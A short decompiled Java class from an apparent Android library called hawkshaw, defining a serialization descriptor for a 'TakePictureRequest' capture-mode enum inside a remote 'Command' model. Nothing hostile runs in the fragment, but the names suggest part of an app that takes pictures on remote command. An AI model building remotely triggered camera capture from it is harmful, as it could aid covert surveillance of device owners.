package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import j3.j;
import java.lang.annotation.Annotation;

public final class o extends j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final o f4899D = new j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode", Command.TakePictureRequest.CaptureMode.values(), new String[]{"MaximizeQuality", "MinimizeLatency", "ZeroShutterLag"}, new Annotation[][]{null, null, null});
    }
}
